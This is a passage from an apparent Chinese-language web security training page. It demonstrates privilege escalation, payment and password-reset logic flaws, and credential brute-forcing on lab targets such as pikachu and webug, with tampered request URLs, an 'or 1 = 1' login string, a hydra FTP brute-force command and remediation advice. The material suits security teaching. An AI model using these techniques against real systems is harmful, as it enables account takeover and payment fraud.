<li>google语法：Google site:baidu.com</li>

<li>子域名扫描器：subdomainbrute、amass、OneForAll子域名挖掘机等等</li>
</ul>

<p>
3、网络空间测绘
</p>

<p>
网络空间测绘收录的有这些关键字的ip域名，很多时候能获取网站的真实ip
</p>

<p>
shadan：<a href="https://www.shodan.io/">https://www.shodan.io/</a>
fofa：<a href="https://fofa.info/">https://fofa.info/</a>
hunter：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a>
zoomeye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a>
</p>

<p>
4、利用网站漏洞
</p>

<p>
phpinfo之类的探针、GitHub信息泄露等
</p>

<p>
XSS盲打，命令执行反弹shell，SSRF等 5、利用邮件服务器找到真实IP
</p>

<p>
在注册等一些需要发送邮件的地方让服务器给自己发送邮件，然后查看邮件服务器的IP地址。这种情况比较适用于小站，因为很多大型企业的邮件服务器都是独立的，不太会和业务站点放在同一服务器上。
</p>

<p>
6、通过分析目标C段来判断真实IP
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:1684ddc6-8a91-40be-bfca-75e685e146a9" class="outline-2">
<h2 id="h:1684ddc6-8a91-40be-bfca-75e685e146a9">越权漏洞</h2>
<div class="outline-text-2" id="text-h:1684ddc6-8a91-40be-bfca-75e685e146a9">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>越权漏洞原理介绍</li>
<li>水平越权攻防还原</li>
<li>垂直越权攻防还原</li>
<li>越权漏洞修复</li>
</ul>
</div>
<div id="outline-container-h:d3b7f053-314a-455b-8347-48a991551232" class="outline-3">
<h3 id="h:d3b7f053-314a-455b-8347-48a991551232">越权漏洞原理介绍</h3>
<div class="outline-text-3" id="text-h:d3b7f053-314a-455b-8347-48a991551232">
<p>
<b>越权访问</b> （Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第一名。
</p>

<p>
为什么说越权漏洞被 OWASP 列为 Web 应用十大安全隐患第一名：
</p>
<ul class="org-ul">
<li>越权漏洞在测试的时候逻辑性很强
<ul class="org-ul">
<li>越权漏洞的测试过程：找到获取数据的接口，准备不同权限的账号，分别去访问，看是否能造成越权行为。</li>
<li>SQL 注入测试过程：看到有接口或者参数，就可以放到 sqlmap 工具中去测试，sqlmap 会自动替换所有参数完成测试，自动化程度很高。</li>
</ul></li>
</ul>

<p>
该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。
</p>

<p>
越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。
</p>

<p>
在实际的代码审计中，这种漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别，目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。
</p>

<ul class="org-ul">
<li><b>水平越权</b> : 指相同权限下不同的用户可以互相访问</li>
<li><b>垂直越权</b> : 指使用权限低的用户可以访问到权限较高的用户</li>
<li><b>水平越权测试方法</b> ：主要通过看看能否通过A用户操作影响到B用户</li>
<li><b>垂直越权测试方法</b> ：看看低权限用户是否能越权使用高权限用户的功能，比如普通用户可以使用管理员的功能。</li>
</ul>
</div>
</div>
<div id="outline-container-h:f233dec1-20f9-4cac-bcd7-73d2d42a3ce7" class="outline-3">
<h3 id="h:f233dec1-20f9-4cac-bcd7-73d2d42a3ce7">水平越权攻防还原</h3>
<div class="outline-text-3" id="text-h:f233dec1-20f9-4cac-bcd7-73d2d42a3ce7">
<p>
pikachu 靶场 Over Permission
</p>

<p>
首先lucy使用自己的账户lucy/123456登录系统，查看自己的个人信息，信息如下：
</p>

<p>
姓名:lucy
性别:girl
手机:12345678922
住址:usa
邮箱:lucy@pikachu.com
</p>

<p>
<a href="http://your_ip/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF">http://your_ip/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</a>
</p>


<figure id="org28656b2">
<img src="./images/img_20230718_143954.png" alt="img_20230718_143954.png" width="50%">

</figure>

<p>
此时，通过更改username=kobe，即可查看到kobe的个人信息，造成水平越权
</p>

<p>
<a href="http://your_ip/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF">http://your_ip/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</a>
</p>



<figure id="orgf5bbdce">
<img src="./images/img_20230718_144018.png" alt="img_20230718_144018.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:f82dcdf0-3a4d-4fa1-829f-7f58020765a4" class="outline-3">
<h3 id="h:f82dcdf0-3a4d-4fa1-829f-7f58020765a4">垂直越权攻防还原</h3>
<div class="outline-text-3" id="text-h:f82dcdf0-3a4d-4fa1-829f-7f58020765a4">
<p>
垂直越权又称纵向越权，指使用权限低的用户可以访问到权限较高的用户。比如A用户权限比B低，如果A可以访问理论上只有B才能访问的资源，或者执行理论上B才能执行的操作，那就是垂直越权。
</p>

<p>
这里有两个用户admin/123456，pikachu/000000：
pikachu用户仅仅具备查看权限
admin是超级管理员，具有添加/删除用户权限，而pikachu没有
</p>



<figure id="org8f61dd2">
<img src="./images/img_20230718_144102.png" alt="img_20230718_144102.png" width="50%">

</figure>


<p>
添加用户的接口如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1/vul/overpermission/op2/op2_admin_edit.php
</pre>
</div>

<p>
数据包如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#30053;
</pre>
</div>

<p>
低权限的账号pikachu通过访问admin账户的接口，能够使用到admin账号添加用户的功能，造成越权
</p>



<figure id="orge4ba3b9">
<img src="./images/img_20230718_144213.png" alt="img_20230718_144213.png" width="50%">

</figure>

<p>
成功创建test账户，确认造成垂直越权
</p>



<figure id="org7714d81">
<img src="./images/img_20230718_144227.png" alt="img_20230718_144227.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:636b9d2a-0618-42ab-930e-5e30b926bff8" class="outline-3">
<h3 id="h:636b9d2a-0618-42ab-930e-5e30b926bff8">越权漏洞修复</h3>
<div class="outline-text-3" id="text-h:636b9d2a-0618-42ab-930e-5e30b926bff8">
<ol class="org-ol">
<li>前后端同时对用户输入信息进行校验，双重验证机制</li>
<li>执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</li>
<li>特别敏感操作可以让用户再次输入密码或其他的验证信息，防范CSRF</li>
<li>从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息</li>
<li>直接对象引用的资源ID进行加密，防止攻击者枚举ID，敏感数据特殊化处理</li>
</ol>
</div>
</div>
</section>
<section id="outline-container-h:f92d0900-be8b-4800-bced-5a25c2ef9fa9" class="outline-2">
<h2 id="h:f92d0900-be8b-4800-bced-5a25c2ef9fa9">逻辑漏洞</h2>
<div class="outline-text-2" id="text-h:f92d0900-be8b-4800-bced-5a25c2ef9fa9">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>逻辑漏洞概述</li>
<li>如何挖掘逻辑漏洞</li>
<li>交易交付中的逻辑问题</li>
<li>密码修改逻辑漏洞</li>
<li>个人项目逻辑漏洞分享</li>
<li>逻辑漏洞修复</li>
</ul>
</div>
<div id="outline-container-h:2f915205-63a9-4341-89d4-43ae5a943c4d" class="outline-3">
<h3 id="h:2f915205-63a9-4341-89d4-43ae5a943c4d">逻辑漏洞概述</h3>
<div class="outline-text-3" id="text-h:2f915205-63a9-4341-89d4-43ae5a943c4d">
<p>
由于程序逻辑输入管控不严，导致程序不能够正常处理或处理错误。一般出现在登录注册、密码找回、信息查看、交易支付金额等位置，由于逻辑漏洞产生的流量多数为合法流量，一般的防护手段或设备无法阻止，也导致了逻辑漏洞成为了企业防护中的难题。
</p>
</div>
</div>
<div id="outline-container-h:5cd3f754-1edf-4a1c-8fdd-dacd00e5eb1a" class="outline-3">
<h3 id="h:5cd3f754-1edf-4a1c-8fdd-dacd00e5eb1a">如何挖掘逻辑漏洞</h3>
<div class="outline-text-3" id="text-h:5cd3f754-1edf-4a1c-8fdd-dacd00e5eb1a">
</div>
<div id="outline-container-h:2a0a45de-717e-4093-9abe-80d331a18771" class="outline-4">
<h4 id="h:2a0a45de-717e-4093-9abe-80d331a18771">注册处</h4>
<div class="outline-text-4" id="text-h:2a0a45de-717e-4093-9abe-80d331a18771">
<p>
注册功能可能出现任意用户注册、短信轰炸等问题。
</p>
<ul class="org-ul">
<li>没有判断邮箱或者的手机号是否有效</li>
</ul>

<p>
前端验证：判断是否有任意用户注册
</p>

<p>
手机验证码验证：验证码是否可以暴力破解，验证码与当前手机号有没有检验匹配（0000-9999）
</p>

<p>
用户名密码注册：是否会导致批量注册
</p>
<ul class="org-ul">
<li>可以发大量广告</li>
<li>僵尸粉丝</li>
<li>反动言论（网信办监察到网站就会关闭）</li>
</ul>
</div>
</div>
<div id="outline-container-h:8c8bbd12-738a-42af-b7a9-5681e51da22b" class="outline-4">
<h4 id="h:8c8bbd12-738a-42af-b7a9-5681e51da22b">登录处</h4>
<div class="outline-text-4" id="text-h:8c8bbd12-738a-42af-b7a9-5681e51da22b">
<p>
可能出现任意用户登录、短信轰炸等问题。
</p>

<p>
前端验证：判断是否有任意用户登录，是否有验证码回显，是否可以修改返回包造成任意用户登录等问题
</p>
<ul class="org-ul">
<li>任意用户登录：有无 sql 注入 <code>xxx or 1 = 1</code></li>
<li>验证码回显：抓包时是否能看到验证码</li>
<li>返回包造成任意用户登录：有的在响应包中修改某一变量值为true时登录成功</li>
</ul>


<p>
手机验证码验证：是否可以爆破验证码，验证码与当前手机号有没有检验匹配
</p>

<p>
账号密码登录：没有验证码或者是否存在验证码可以绕过，导致进行暴力破解
</p>
</div>
</div>
<div id="outline-container-h:b84ac8ef-9646-489f-864d-0547cdaad901" class="outline-4">
<h4 id="h:b84ac8ef-9646-489f-864d-0547cdaad901">密码找回处</h4>
<div class="outline-text-4" id="text-h:b84ac8ef-9646-489f-864d-0547cdaad901">
<ol class="org-ol">
<li>验证码是否可以多次使用</li>
<li>验证码是否直接返回在数据包中</li>
<li>验证码未绑定用户。
<ul class="org-ul">
<li>如用 A 的账号密码获取短信验证码后，账号密码改成B的登录成功。</li>
</ul></li>
<li>修改接收的手机或邮箱进行密码重置。
<ul class="org-ul">
<li>如账号和手机号没有绑定</li>
</ul></li>
<li>前端验证绕过。
<ul class="org-ul">
<li>如短信验证码或者图形验证码就是个摆设没有生效</li>
</ul></li>
<li>验证步骤绕过（举例：先获取手机验证码，再输入要修改的邮箱和密码）
<ul class="org-ul">
<li>修改密码的功能点，修改之前需要先检验短信验证码：
第一个数据包：输入短信验证码并进行校验。yanzheng=xxx
第二个数据包：输入要修改的密码。user=A&amp;newpwd=xxx，修改user=B成功
不用2个数据包校验就能规避掉这个问题了</li>
</ul></li>
<li>未校验用户字段的值</li>
<li>修改密码处id可替换</li>
<li>等等</li>
</ol>
</div>
</div>
<div id="outline-container-h:3f1b348f-7236-4bef-9df5-bb5dd3eecf64" class="outline-4">
<h4 id="h:3f1b348f-7236-4bef-9df5-bb5dd3eecf64">支付与越权</h4>
<div class="outline-text-4" id="text-h:3f1b348f-7236-4bef-9df5-bb5dd3eecf64">
<ul class="org-ul">
<li>提交订单或者结算时对金额等参数进行修改</li>
<li>提交订单时修改商品参数（低价购买高价商品）</li>
<li>修改支付接口等等（将支付链接发给别人，这也是为什么支付宝在支付的时候还要再输一次密码）</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:8f512b7e-4ebc-42da-a2f3-e8705aca5a9c" class="outline-3">
<h3 id="h:8f512b7e-4ebc-42da-a2f3-e8705aca5a9c">交易支付中的逻辑问题</h3>
<div class="outline-text-3" id="text-h:8f512b7e-4ebc-42da-a2f3-e8705aca5a9c">
<p>
支付漏洞的理解通常都是篡改价格。比如，一分钱买任何东西，少收款、企业收费产品被免费使用，直接造成企业的经济损失。
</p>
</div>
<div id="outline-container-h:914af5a2-c0c2-44a8-b68f-c76a993dd015" class="outline-4">
<h4 id="h:914af5a2-c0c2-44a8-b68f-c76a993dd015">支付逻辑漏洞的呈现形式</h4>
<div class="outline-text-4" id="text-h:914af5a2-c0c2-44a8-b68f-c76a993dd015">
<ol class="org-ol">
<li>充值的时候，程序只判断订单有没有充值成功，但没有判断金额
例如：生成订单跳至支付宝页面，在原网站上点支付失败，这时可以修改订单，改成更大的金额（订单号没变），回到支付宝支付页面，支付成功。程序并没有重新核对支付宝实际的金额，只是把订单改为已支付。</li>

<li>使用余额支付，把数量改为负数，总金额也为负数，扣除余额时，负负得正，这时余额增加。</li>

<li>支付逻辑漏洞的几种常见类型：
<ul class="org-ul">
<li>修改金额</li>
<li>修改商品数量</li>
<li>修改优惠金额</li>
<li>修改数量、单价，优惠价格参数为负数、小数，无限大</li>
<li>商品价格更改</li>
<li>支付key泄露等</li>
</ul></li>
</ol>
</div>
</div>
<div id="outline-container-h:b8060825-d36e-4958-81fd-7ec957227b67" class="outline-4">
<h4 id="h:b8060825-d36e-4958-81fd-7ec957227b67">支付漏洞案例</h4>
<div class="outline-text-4" id="text-h:b8060825-d36e-4958-81fd-7ec957227b67">
<p>
漏洞环境：webug
使用 docker 安装
</p>

<div class="org-src-container">
<pre class="src src-sh">docker pull area39/webug
docker run -d -p 8082:80 -p 33060:3306 area39/webug
</pre>
</div>

<p>
安装成功后访问 <a href="http://127.0.0.1:8082/control/login.php">http://127.0.0.1:8082/control/login.php</a>
</p>

<p>
默认账号：admin/admin
数据库账号：root/toor
</p>

<p>
打开支付漏洞靶场: web 靶场 &#x2013;&gt; 逻辑漏洞 &#x2013;&gt; 支付漏洞
</p>



<figure id="org15209cf">
<img src="./images/img_20230718_144819.png" alt="img_20230718_144819.png" width="50%">

</figure>

<p>
某网站商城页面
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8082/control/auth_cross/cross_permission_pay.php
</pre>
</div>



<figure id="org2f41598">
<img src="./images/img_20230718_144846.png" alt="img_20230718_144846.png" width="50%">

</figure>

<p>
点击购买时尚宝宝衣服，直接购买需要花费100元
</p>

<p>
通过截取数据包修改价格参数price为0.1，即可通过0.1元购买100元的商品
</p>
<ul class="org-ul">
<li>打开burp抓包修改参数</li>
</ul>


<figure id="org166385e">
<img src="./images/img_20230718_144920.png" alt="img_20230718_144920.png" width="50%">

</figure>
</div>
</div>
</div>
<div id="outline-container-h:dcfde62b-756f-41b6-901b-5b8e0469f16b" class="outline-3">
<h3 id="h:dcfde62b-756f-41b6-901b-5b8e0469f16b">密码修改逻辑漏洞</h3>
<div class="outline-text-3" id="text-h:dcfde62b-756f-41b6-901b-5b8e0469f16b">
<p>
web 靶场 &#x2013;&gt; 逻辑漏洞 &#x2013;&gt; 越权修改密码
</p>


<figure id="org5cbbca1">
<img src="./images/img_20230718_145043.png" alt="img_20230718_145043.png" width="50%">

</figure>

<p>
访问"越权修改密码"靶场：
</p>


<figure id="org4965c18">
<img src="./images/img_20230718_145056.png" alt="img_20230718_145056.png" width="50%">

</figure>

<p>
进入docker中的mysql
</p>

<div class="org-src-container">
<pre class="src src-sh">docker exec -it &lt;id&gt; bash
mysql -uroot -p
Enter password: toor
</pre>
</div>

<p>
查看网站后台管理系统的账号密码，知道该系统有两个账户（其中aaaaa是临时加的）：
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; use webug
mysql&gt; select * from user_test;
id username password
1 admin admin
2 aaaaa asdfsadf
</pre>
</div>

<p>
首先登录aaaaa/asdfsadf的账户：
</p>
<ul class="org-ul">
<li>靶场环境存在bug，删除路径中的 pt_env</li>
</ul>


<figure id="orgb545c14">
<img src="./images/img_20230718_145314.png" alt="img_20230718_145314.png" width="50%">

</figure>

<p>
对aaaaa账户进行修改密码的操作：发现修改密码处未对旧密码进行验证，旧密码处输入任意内容，可以直接修改密码
</p>


<figure id="org481c1df">
<img src="./images/img_20230718_145330.png" alt="img_20230718_145330.png" width="50%">

</figure>



<figure id="orgb40b903">
<img src="./images/img_20230718_145347.png" alt="img_20230718_145347.png" width="50%">

</figure>

<p>
观察数据包我们发现id值可以被篡改，一般来说管理员的id值一般为1或者0
</p>



<figure id="orgac96aa3">
<img src="./images/img_20230718_145409.png" alt="img_20230718_145409.png" width="50%">

</figure>

<p>
将id修改为1进行尝试，发现修改成功
</p>


<figure id="org3b6821c">
<img src="./images/img_20230718_145423.png" alt="img_20230718_145423.png" width="50%">

</figure>

<p>
查看 webug 库下的 user_test 表
</p>

<div class="org-src-container">
<pre class="src src-sql">use webug;
<span style="color: #a020f0;">select</span> * <span style="color: #a020f0;">from</span> user_test;

mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a020f0;">from</span> user_test;
+<span style="color: #b22222;">----</span><span style="color: #b22222;">+----------+----------+</span>
| id | username | password |
+<span style="color: #b22222;">----</span><span style="color: #b22222;">+----------+----------+</span>
|  1 | <span style="color: #a020f0;">admin</span>    | 1234     |
|  2 | aaaaa    | 123      |
+<span style="color: #b22222;">----</span><span style="color: #b22222;">+----------+----------+</span>
2 <span style="color: #a020f0;">rows</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.00 sec)
</pre>
</div>
<p>
此时 admin 账户的密码已经被更改为：1234，通过低权限的账户修改了管理员账户的密码，使用admin/1234 即可成功登录。
</p>

<p>
小结：
</p>
<ul class="org-ul">
<li>通过 id 来指定用户，并非是通过 cookie</li>
<li>系统后端没有对旧密码进行校验</li>
</ul>
</div>
</div>
<div id="outline-container-h:cf5508a5-e935-40a1-ae36-a6b578f276c7" class="outline-3">
<h3 id="h:cf5508a5-e935-40a1-ae36-a6b578f276c7">实战项目逻辑漏洞分享</h3>
<div class="outline-text-3" id="text-h:cf5508a5-e935-40a1-ae36-a6b578f276c7">
</div>
<div id="outline-container-h:7297705a-4501-4f6a-a510-7aa6f9e8bc28" class="outline-4">
<h4 id="h:7297705a-4501-4f6a-a510-7aa6f9e8bc28">验证码回传导致任意用户注册</h4>
<div class="outline-text-4" id="text-h:7297705a-4501-4f6a-a510-7aa6f9e8bc28">
<p>
由于程序逻辑校验不严，导致验证码直接在显示响应包中，造成任意用户注册。
</p>


<figure id="org2b66690">
<img src="./images/img_20230718_145552.png" alt="img_20230718_145552.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:77cfaa72-78dd-4982-94a6-41a2f7f739cc" class="outline-4">
<h4 id="h:77cfaa72-78dd-4982-94a6-41a2f7f739cc">任意用户登录</h4>
<div class="outline-text-4" id="text-h:77cfaa72-78dd-4982-94a6-41a2f7f739cc">
<p>
用户注册成功后，第一次会直接以注册的用户身份登录，而无需用户输入账号密码登录，查找是否有用户的参数username，userid等进行替换：
</p>



<figure id="org08664de">
<img src="./images/img_20230718_145630.png" alt="img_20230718_145630.png" width="50%">

</figure>

<p>
截取并查看响应数据包，发现系统是通过userid、username等参数进行身份验证及登录：
</p>


<figure id="org7b9d865">
<img src="./images/img_20230718_145653.png" alt="img_20230718_145653.png" width="50%">

</figure>

<p>
再去截取请求数据包，修改userid值，成功登录他人用户 ：
</p>



<figure id="orga8d249f">
<img src="./images/img_20230718_145710.png" alt="img_20230718_145710.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:9b701b33-983a-4fa1-bace-bfc6856321cb" class="outline-4">
<h4 id="h:9b701b33-983a-4fa1-bace-bfc6856321cb">任意密码重置</h4>
<div class="outline-text-4" id="text-h:9b701b33-983a-4fa1-bace-bfc6856321cb">
<p>
随意输入旧密码，输入用户名账号以及新密码，点击修改密码，截取数据包
</p>

<p>
将响应包由false改为true
</p>


<figure id="orgd28f488">
<img src="./images/img_20230718_145731.png" alt="img_20230718_145731.png" width="50%">

</figure>



<figure id="org214093c">
<img src="./images/img_20230718_145748.png" alt="img_20230718_145748.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:044a1c80-a036-4460-b33a-c68b58061943" class="outline-4">
<h4 id="h:044a1c80-a036-4460-b33a-c68b58061943">支付漏洞</h4>
<div class="outline-text-4" id="text-h:044a1c80-a036-4460-b33a-c68b58061943">
<p>
某商品价格为123元
</p>



<figure id="org476ee30">
<img src="./images/img_20230718_145809.png" alt="img_20230718_145809.png" width="50%">

</figure>


<p>
修改总价为1元
</p>


<figure id="org8e40934">
<img src="./images/img_20230718_145822.png" alt="img_20230718_145822.png" width="50%">

</figure>

<p>
最后成功购买
</p>


<figure id="org00ed107">
<img src="./images/img_20230718_145837.png" alt="img_20230718_145837.png" width="50%">

</figure>
</div>
</div>
</div>
<div id="outline-container-h:ea84ab4e-8a14-4ab1-9033-ee35aa8af63b" class="outline-3">
<h3 id="h:ea84ab4e-8a14-4ab1-9033-ee35aa8af63b">逻辑漏洞修复</h3>
<div class="outline-text-3" id="text-h:ea84ab4e-8a14-4ab1-9033-ee35aa8af63b">
<ol class="org-ol">
<li>正确的配置用户的权限信息，不要使用简单的cookie或session</li>
<li>对同一手机号进行识别，一定时间内不允许继续发送验证短信请求，也就是所谓的一分钟内不允许继续请求
<ul class="org-ul">
<li>规避短信轰炸</li>
</ul></li>
<li>加入用户身份认证机制或者token验证，防止可被直接通过链接就可访问到用户的功能进行操作</li>
<li>删除特权码，不要仅仅对code等返回值进行校验</li>
<li>订单类在后端检查订单的每一个值，包括支付状态，MD5加密&amp;解密、数字签名及验证，有效的避免数据修改、重放攻击中的各种问题</li>
<li>避免使用前端校验，在后端严格校验用户的数据</li>
</ol>
</div>
</div>
</section>
<section id="outline-container-h:66d57a3a-46d2-4b33-8107-6aa4878a5904" class="outline-2">
<h2 id="h:66d57a3a-46d2-4b33-8107-6aa4878a5904">暴力猜解</h2>
<div class="outline-text-2" id="text-h:66d57a3a-46d2-4b33-8107-6aa4878a5904">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>C/S 架构暴力破解(常用网络、系统、数据库、第三方应用密码爆破)</li>
<li>B/S 架构暴力猜解-常用 web 密码爆破</li>
<li>hydra 安装与使用</li>
<li>暴力猜解安全防范</li>
</ul>

<p>
暴力破解是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止。
</p>

<p>
暴力破解产生是由于服务器没有对接收的参数进行限制，导致攻击者可以通过暴力手段进行破解所需要的信息(如账号，密码，验证码等)，暴力破解的原理就是穷举法，其基本思想是根据部分条件确定已知条件的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。
</p>
</div>
<div id="outline-container-h:d6c6e9c9-d208-4894-ae36-81ef58205690" class="outline-3">
<h3 id="h:d6c6e9c9-d208-4894-ae36-81ef58205690">C/S架构暴力破解</h3>
<div class="outline-text-3" id="text-h:d6c6e9c9-d208-4894-ae36-81ef58205690">
<p>
（常用网络协议、系统、数据库、第三方应用密码破解）
</p>

<p>
暴力破解FTP
暴力破解SSH
暴力破解SMB
暴力破解Sqlserver
暴力破解Mysql
暴力破解Redis等等
</p>

<p>
破解工具：
</p>
<ul class="org-ul">
<li>hydra</li>
</ul>
</div>
</div>
<div id="outline-container-h:4a3a8a66-15f9-434e-bb58-e2e5a56f8e2a" class="outline-3">
<h3 id="h:4a3a8a66-15f9-434e-bb58-e2e5a56f8e2a">B/S架构暴力破解</h3>
<div class="outline-text-3" id="text-h:4a3a8a66-15f9-434e-bb58-e2e5a56f8e2a">
<p>
B/S架构即浏览器/服务器结构暴力破解：
</p>

<p>
破解工具：
</p>
<ul class="org-ul">
<li>burp suite</li>
</ul>

<p>
访问 bluecms 后台
</p>

<p>
<a href="http://your_ip/bluecms/uploads/admin/login.php?act=login">http://your_ip/bluecms/uploads/admin/login.php?act=login</a>
</p>



<figure id="org0078902">
<img src="./images/img_20230718_150202.png" alt="img_20230718_150202.png" width="50%">

</figure>

<p>
利用 burpsuite 截取登陆处数据包：
</p>


<figure id="orge7f3483">
<img src="./images/img_20230718_150223.png" alt="img_20230718_150223.png" width="50%">

</figure>

<p>
发送到 repeater 进行重放发现服务器返回：您输入的用户名和密码有误
</p>


<figure id="org8d77eac">
<img src="./images/img_20230718_150240.png" alt="img_20230718_150240.png" width="50%">

</figure>

<p>
发送到 burpsuite 的 intruder 选项卡进行暴力破解
</p>

<p>
使用Clear $清除标志
给需要破解的字段值利用Add $打上标志
</p>


<figure id="org93a836c">
<img src="./images/img_20230718_150320.png" alt="img_20230718_150320.png" width="50%">

</figure>

<p>
在payload选项中导入字典
</p>


<figure id="orgc038928">
<img src="./images/img_20230718_150337.png" alt="img_20230718_150337.png" width="50%">

</figure>

<p>
点击开始Start attack开始破解：
</p>

<p>
等待破解完毕：
点击Length，发现密码为admin123的时候，Length与其他响应不相同
</p>


<figure id="orgef052c9">
<img src="./images/img_20230718_150409.png" alt="img_20230718_150409.png" width="50%">

</figure>

<p>
即登录成功
</p>



<figure id="org6943edf">
<img src="./images/img_20230718_150443.png" alt="img_20230718_150443.png" width="50%">

</figure>

<p>
利用admin/admin123成功登录系统
</p>


<figure id="org8e62c1f">
<img src="./images/img_20230718_150459.png" alt="img_20230718_150459.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:1fe4ab33-6bc6-4740-8032-d07adc4b90ce" class="outline-3">
<h3 id="h:1fe4ab33-6bc6-4740-8032-d07adc4b90ce">hydra(九头蛇)的安装与使用</h3>
<div class="outline-text-3" id="text-h:1fe4ab33-6bc6-4740-8032-d07adc4b90ce">
<p>
hydra 是一个网络帐号破解工具，支持多种协议。其作者是van Hauser，David Maciejak与其共同维护。hydra在所有支持GCC的平台能很好的编译，包括Linux，所有版本的BSD，Mac OS，Solaris等。
</p>

<ul class="org-ul">
<li>github地址 <a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></li>
</ul>
</div>
<div id="outline-container-h:03b49ed5-07e4-4b77-a8a7-1ef3a0503b93" class="outline-4">
<h4 id="h:03b49ed5-07e4-4b77-a8a7-1ef3a0503b93">hydra的安装</h4>
<div class="outline-text-4" id="text-h:03b49ed5-07e4-4b77-a8a7-1ef3a0503b93">
<p>
1、windows安装hydra：
</p>

<p>
下载安装包 <a href="https://github.com/maaaaz/thc-hydra-windows">https://github.com/maaaaz/thc-hydra-windows</a>
</p>

<p>
解压当前路径打开CMD即可
</p>

<p>
2、kali linux下自带hydra
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">centos</span>
sudo yum -y install hydra

<span style="color: #b22222;"># </span><span style="color: #b22222;">macos</span>
brew install hydra
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0cb635e1-9dc6-4fde-9107-4408778f0c53" class="outline-4">
<h4 id="h:0cb635e1-9dc6-4fde-9107-4408778f0c53">hydra的使用</h4>
<div class="outline-text-4" id="text-h:0cb635e1-9dc6-4fde-9107-4408778f0c53">
<p>
hydra常用参数：
</p>
<div class="org-src-container">
<pre class="src src-sh">-l &#25351;&#23450;&#19968;&#20010;&#29992;&#25143;&#21517;
-P &#25351;&#23450;&#19968;&#20010;&#23494;&#30721;&#23383;&#20856;
-s &#25351;&#23450;&#31471;&#21475;
-L &#25351;&#23450;&#19968;&#20010;&#29992;&#25143;&#21517;&#23383;&#20856;
-vV &#26174;&#31034;&#27599;&#27425;&#30340;&#23581;&#35797;&#20449;&#24687;
-f &#36935;&#21040;&#27491;&#30830;&#30340;&#23494;&#30721;&#65292;&#20572;&#27490;&#29190;&#30772;
-o &#23558;&#32467;&#26524;&#36755;&#20986;&#21040;&#25991;&#20214;&#20013;
-M &#25351;&#23450;&#19968;&#20010;&#26381;&#21153;&#22120;&#21015;&#34920;
-t Tasks&#21516;&#26102;&#36816;&#34892;&#30340;&#32447;&#31243;&#25968;,&#40664;&#35748;&#20026;16
-e nsr : n&#65306;&#23581;&#35797;&#31354;&#23494;&#30721; s&#65306;&#23558;&#29992;&#25143;&#21517;&#20316;&#20026;&#23494;&#30721; r&#65306;&#23558;&#29992;&#25143;&#21517;&#21453;&#21521;
</pre>
</div>

<p>
<a href="https://www.xp.cn/phpstudy-v8/ftp.html">使用phpstudy开启ftp</a>
</p>

<p>
设置账号为 ftp/xxx123 并启动ftp服务
</p>

<ul class="org-ul">
<li>FTP &#x2013;&gt; 创建FTP，设置账号密码</li>
<li>首页 &#x2013;&gt; 启动FTP</li>
</ul>


<figure id="org6ac41a6">
<img src="./images/img_20230728_162152.png" alt="img_20230728_162152.png" width="50%">

</figure>


<p>
<b>使用hydra暴力破解ftp服务：</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">hydra 192.168.108.129 ftp -l ftp -P pwd.txt -vV -f -e ns
</pre>
</div>

<p>
成功破解出密码为： ftp/xxx123
</p>

<p>
利用该密码成功登录ftp服务器
</p>

<p>
<a href="ftp://192.168.108.129/">ftp://192.168.108.129/</a>
</p>



<figure id="orgc624810">
<img src="./images/img_20230718_150821.png" alt="img_20230718_150821.png" width="50%">

</figure>



<figure id="org3733e4c">
<img src="./images/img_20230718_150832.png" alt="img_20230718_150832.png" width="50%">

</figure>

<p>
<b>使用hydra暴力破解ssh服务：</b>
</p>

<p>
首先在Windows系统中安装openssh，以Win7为例：
</p>


<figure id="orga6042cb">
